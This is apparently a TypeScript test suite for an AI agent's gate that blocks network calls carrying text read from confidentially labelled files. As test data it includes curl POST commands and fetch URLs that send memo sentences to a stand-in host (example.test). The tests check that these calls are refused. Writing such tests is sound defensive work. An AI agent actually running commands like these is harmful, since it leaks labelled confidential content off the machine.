// D-60 (owner, 2026-11-17): at a mark that is not any-cloud but not strict (org/Internal, attested-cloud), network tools keep running, but labelled text
// the chat's agents read must not leave in a network call's payload. A chat reads a labelled memo; the gate then checks each call that may send data off
// this computer against fingerprints of what was read. Every project is under the temporary folder, every label file is unsigned (labels only raise), and
// nothing is sent: the gate only decides.
import assert from 'node:assert/strict';
import { readFileSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import test from 'node:test';
import { gateToolCall } from '../agent/gateAdapter';
import { MAX_OUTBOUND_FINGERPRINTS, OUTBOUND_EARLIER_TEXT, OUTBOUND_FULL_TEXT, OUTBOUND_LIMITS_TEXT, OUTBOUND_MATCH_TEXT, OUTBOUND_UNREADABLE_TEXT, OutboundFingerprints, outboundPayload } from '../agent/outboundCheck';
import { DEFAULT_RULES } from '../agent/permissions';
import type { RunGrants } from '../agent/permissions';
import { bashTool } from '../agent/tools';
import type { AgentTool } from '../agent/tools';
import { webFetchTool, webSearchTool } from '../agent/webTools';
import { braveSearch } from '../agent/webSearch';
import type { McpConnection } from '../mcp/client';
import { mcpAgentTools } from '../mcp/tools';
import { GATE_RULE_IDS } from '../domain/gate/decide';
import type { MemoryGateRuntime } from '../agent/gateAdapter';
import { testGateHost, testGateRuntime } from './helpers/gatedRuns';
import { call, grantsAt, keys, label, labelledProject, runWith, scripted } from './helpers/markFixtures';
import { AgentConversation } from '../services/agentSession';
import { stateHomeFor } from '../services/stateHome';
import { stateKeysFor } from '../services/stateKeys';
import { ThreadStore } from '../services/threadStore';
import { MemorySecrets } from './helpers/stateFixtures';

const MEMO = 'The northern depot closes on the ninth of March and the staff move to the river office before the audit begins.';
const LINE = 'Quarterly figures show the river office spent four hundred thousand on contractors last year.';

const connection = { tools: [{ name: 'lookup', description: 'x', inputSchema: { type: 'object' }, readOnly: true, destructive: false }], call: async () => 'ok' } as unknown as McpConnection;
const [remoteTool] = mcpAgentTools({ id: 'remote', name: 'Remote', transport: 'http', approval: 'trusted' }, connection, 'mcp.example.test');

/** A chat that has read memo.md (org/Internal) in a project: its mark is org/Internal and its fingerprints hold the memo. */
async function afterReadingMemo(): Promise<{ root: string; grants: RunGrants; runtime: MemoryGateRuntime }> {
  const root = labelledProject({ entries: { 'memo.md': label('org', 'Internal') } });
  writeFileSync(path.join(root, 'memo.md'), `${MEMO}\n${LINE}\n`);
  const grants = grantsAt([label('org', 'Public')]);
  const runtime = testGateRuntime();
  await runWith(root, [call('r1', 'Read', { file_path: 'memo.md' })], grants, runtime);
  assert.deepEqual(keys(grants.mark!.current()), ['org/Internal']);
  assert.ok(grants.outbound!.size > 0, 'the labelled read was fingerprinted');
  return { root, grants, runtime };
}

async function decide(root: string, grants: RunGrants, runtime: MemoryGateRuntime, tool: AgentTool<any>, raw: Record<string, unknown>) {
  const command = tool.capability === 'shell' ? String(raw.command) : undefined;
  return gateToolCall(runtime, {
    tool, raw, root, callId: `${tool.name}-${JSON.stringify(raw).slice(0, 40)}`, ...(command === undefined ? {} : { command, shell: { cwd: root } }),
    policy: { mode: 'fully-autonomous', emergencyStop: false }, rules: DEFAULT_RULES, grants, buildAuto: async () => undefined
  });
}

test('label.outbound-match is a named rule', () => {
  assert.ok(GATE_RULE_IDS.includes('label.outbound-match'));
});

test('at an org/Internal mark, a web search with unrelated words runs', async () => {
  const { root, grants, runtime } = await afterReadingMemo();
  const search = await decide(root, grants, runtime, webSearchTool(braveSearch('stand-in-key')), { query: 'weather forecast for tomorrow in the mountains near town' });
  assert.equal(search.decision.outcome, 'allow');
  assert.ok(!search.decision.rule.startsWith('label.'), search.decision.rule);
});

test('a fetch whose URL carries a labelled sentence, a remote add-on call with a labelled line in its arguments, and a curl POST of a labelled line are refused', async () => {
  const { root, grants, runtime } = await afterReadingMemo();
  const fetched = await decide(root, grants, runtime, webFetchTool, { url: `https://example.test/search?q=${encodeURIComponent(MEMO.slice(0, 80))}` });
  assert.equal(fetched.decision.rule, 'label.outbound-match');
  assert.equal(fetched.decision.reason, OUTBOUND_MATCH_TEXT);
  const plus = await decide(root, grants, runtime, webFetchTool, { url: `https://example.test/?q=${MEMO.toUpperCase().replace(/ /g, '+')}` });
  assert.equal(plus.decision.rule, 'label.outbound-match', 'case and + for spaces do not hide it');
  const mcp = await decide(root, grants, runtime, remoteTool!, { query: { text: `please summarise: ${LINE}` } });
  assert.equal(mcp.decision.rule, 'label.outbound-match');
  const curl = await decide(root, grants, runtime, bashTool, { command: `curl -X POST -d "${LINE}" https://example.test/collect` });
  assert.equal(curl.decision.rule, 'label.outbound-match');
  for (const gated of [fetched, mcp, curl]) assert.equal(gated.decision.outcome, 'deny');
});

test('a paraphrase passes: the documented limit', async () => {
  const { root, grants, runtime } = await afterReadingMemo();
  const paraphrase = await decide(root, grants, runtime, webFetchTool, { url: `https://example.test/?q=${encodeURIComponent('depot in the north shuts in March, people relocate to the riverside site ahead of the review')}` });
  assert.notEqual(paraphrase.decision.rule, 'label.outbound-match');
  assert.match(OUTBOUND_LIMITS_TEXT, /does not catch a paraphrase/);
});

test('the fingerprints and the labelled text never reach a record, and a refusal names the rule and the label', async () => {
  const { root, grants, runtime } = await afterReadingMemo();
  await decide(root, grants, runtime, bashTool, { command: `curl -d "${LINE}" https://example.test/x` });
  const refusal = runtime.records.at(-1)!;
  assert.equal(refusal.authorizations[0]?.policy.name, 'label.outbound-match');
  assert.equal(refusal.unmapped.nearAi.label?.level, 'Internal');
  // The refusal names the tool, not the command that carried the text, so no record holds the labelled words.
  assert.equal(refusal.resources[0]?.name, 'Bash');
  const recorded = JSON.stringify(runtime.records).toLowerCase();
  for (const words of ['northern depot', 'river office', 'four hundred thousand', 'contractors']) assert.ok(!recorded.includes(words), `no record holds "${words}"`);
  // The fingerprint set has no way to be written out.
  assert.equal(JSON.stringify(grants.outbound), '"[outbound fingerprints]"');
});

test('fail closed: arguments that cannot be read, and a full fingerprint set, are refused at a mark that is not any-cloud; at an any-cloud mark nothing is checked', async () => {
  const { root, grants, runtime } = await afterReadingMemo();
  let deep: Record<string, unknown> = { text: 'x' };
  for (let index = 0; index < 40; index += 1) deep = { inner: deep };
  const unreadable = await decide(root, grants, runtime, remoteTool!, deep);
  assert.equal(unreadable.decision.rule, 'label.outbound-match');
  assert.equal(unreadable.decision.reason, OUTBOUND_UNREADABLE_TEXT);
  assert.throws(() => outboundPayload(deep));
  const full = new OutboundFingerprints();
  full.add(Array.from({ length: MAX_OUTBOUND_FINGERPRINTS + 20 }, (_, index) => `w${index}`).join(' '));
  assert.equal(full.full, true);
  grants.outbound = full;
  const anything = await decide(root, grants, runtime, webSearchTool(braveSearch('stand-in-key')), { query: 'weather' });
  assert.equal(anything.decision.rule, 'label.outbound-match', 'a full set counts as a match');
  // Owner answer: past the limit the refusal says why and what to do.
  assert.equal(anything.decision.reason, OUTBOUND_FULL_TEXT);
  assert.match(OUTBOUND_FULL_TEXT, /more labelled content than NEAR AI can keep track of/);
  assert.match(OUTBOUND_FULL_TEXT, /Start a new chat/);
  assert.match(OUTBOUND_FULL_TEXT, /NEAR AI: Lower This Chat's Label/);
  // At an any-cloud mark the payload is not checked, even with fingerprints held.
  const open = grantsAt([label('org', 'Public')]);
  open.outbound!.add(LINE);
  const curl = await decide(root, open, testGateRuntime(), bashTool, { command: `curl -d "${LINE}" https://example.test/x` });
  assert.notEqual(curl.decision.rule, 'label.outbound-match');
});

test('only labelled reads are fingerprinted: reading a public file at an Internal mark adds nothing', async () => {
  const { root, grants, runtime } = await afterReadingMemo();
  const before = grants.outbound!.size;
  await runWith(root, [call('r2', 'Read', { file_path: 'notes.md' })], grants, runtime);
  assert.equal(grants.outbound!.size, before);
  assert.ok(readFileSync(path.join(root, 'notes.md'), 'utf8').length > 0);
});

// ---- PR #87 review round 1 ----

test('review 2: at an attested-cloud mark, a run with no fingerprint set refuses a call that may send (fail closed)', async () => {
  const { root, runtime } = await afterReadingMemo();
  const grants = grantsAt([label('org', 'Internal')]);
  grants.outbound = undefined;
  const fetched = await decide(root, grants, runtime, webFetchTool, { url: 'https://example.test/?q=weather' });
  assert.equal(fetched.decision.rule, 'label.outbound-match');
  assert.equal(fetched.decision.reason, OUTBOUND_UNREADABLE_TEXT);
});

test('review 3: a reopened chat treats its earlier results as labelled and says so truly, not that it read labelled content', async () => {
  const root = labelledProject();
  const store = new ThreadStore(stateHomeFor(root), stateKeysFor(root, new MemorySecrets()), { writer: 'edA.1' });
  const chat = new AgentConversation(root, () => undefined, path.join(root, '.ckpt'), undefined, store);
  chat.gateHost = testGateHost();
  await chat.send({ text: 'go', client: scripted([call('r1', 'Read', { file_path: 'notes.md' })]) as never, model: 'm', privacy: 'Private', policy: { mode: 'fully-autonomous', emergencyStop: false }, rules: DEFAULT_RULES });
  await store.setChatLabel(chat.id, [label('org', 'Internal')]);
  const reopened = new AgentConversation(root, () => undefined, path.join(root, '.ckpt'), undefined, store);
  assert.ok(await reopened.restore(chat.id));
  const grants = grantsAt([label('org', 'Internal')]);
  grants.outbound = reopened.outbound;
  const quoted = await decide(root, grants, testGateRuntime(), webFetchTool, { url: `https://example.test/?q=${encodeURIComponent('PUBLIC notes anyone may read')}` });
  assert.equal(quoted.decision.rule, 'label.outbound-match', 'still refused (fail closed)');
  assert.equal(quoted.decision.reason, OUTBOUND_EARLIER_TEXT);
  assert.doesNotMatch(OUTBOUND_EARLIER_TEXT, /has read labelled content/);
  // Text read as labelled in this window keeps the labelled sentence.
  const prints = new OutboundFingerprints();
  prints.addEarlier('an earlier public result with plenty of ordinary words in it');
  prints.add(LINE);
  assert.equal(prints.match([LINE]), 'labelled');
  assert.equal(prints.match(['an earlier public result with plenty of ordinary words in it']), 'earlier');
  assert.equal(prints.match(['nothing in common here at all with anything']), undefined);
});
